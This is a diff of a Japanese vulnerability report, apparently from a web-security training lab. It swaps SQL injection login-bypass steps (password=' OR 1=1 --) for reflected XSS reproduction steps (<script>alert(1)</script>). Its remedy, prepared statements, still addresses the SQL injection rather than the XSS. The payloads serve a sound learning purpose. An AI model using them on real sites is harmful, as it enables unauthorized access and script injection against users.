@@ -23,54 +23,34 @@ GET /?search= に入る入力値が適切なエスケープ処理を行わない
 
 ## 再現手順
 1 対象URLへアクセス https://〜/?search=  
-2 GET /?search=testを入力し<h1>ないにtestが表示されたため、XSSであると推測しました。  
+2 GET /?search=testを入力し<h1>内にtestが表示されたため、XSSであると推測しました。  
 3 <script>alert(1)</script> を入力し、alertが発生することを確認しました。  
 　これにより反射型XSSが成立することを確認しました。 
 
 <details>
-<summary>3 HTTPリクエスト/レスポンス</summary>
+<summary>2 HTTPリクエスト/レスポンス</summary>
   
 リクエスト
-POST /login HTTP/2
-csrf=vaY3jY9jzncgNZ1kN2tUYhtnVeTkNECM&username=administrator&password='
-  
-レスポンス
-HTTP/2 500 Internal Server Error
-Internal Server Error
-
-</details>
-  
-csrf=vaY3jY9jzncgNZ1kN2tUYhtnVeTkNECM&username=administrator&password=' OR 1=1 --
-認証すり抜けできたこと確認しました。
- 
-<details>
-<summary>4 HTTPリクエスト/レスポンス</summary>
-  
-リクエスト
-POST /login HTTP/2
-csrf=rbDJFRNtXk7k3TTIiOLsBEkyAhJveb3X&username=administrator&password=' OR 1=1 --
-  
-レスポンス
-HTTP/2 302 Found
-Location: /my-account?id=administrator
-
-</details>
- 
-5 csrf=tpKp74evhAetZsQXUvFzrAdgIY7BrNXg&username=administrator&password=' OR 1=2 --
- SQL文は壊れず、正常に認証が通らなかったこと確認しました。
-<details>
-<summary>5 HTTPリクエスト/レスポンス</summary>
-  
-リクエスト
-POST /login HTTP/2
-csrf=tpKp74evhAetZsQXUvFzrAdgIY7BrNXg&username=a&password=' OR 1=2 --
+GET /?search=test
   
 レスポンス
 HTTP/2 200 OK
-<p class=is-warning>Invalid username or password.</p>
-   
-</details>
+<h1>3 search results for 'test'</h1>
 
+</details>
+ 
+<details>
+<summary>3 HTTPリクエスト/レスポンス</summary>
+  
+リクエスト
+GET /?search=<script>alert(1)</script> 
+  
+レスポンス
+HTTP/2 200 OK
+<h1>0 search results for '<script>alert(1)</script>'</h1>
+
+</details>
+ 
 
 ## 対策
 プリペアドステートメントを使用し、ユーザ入力が文字連結しないようにしてください。
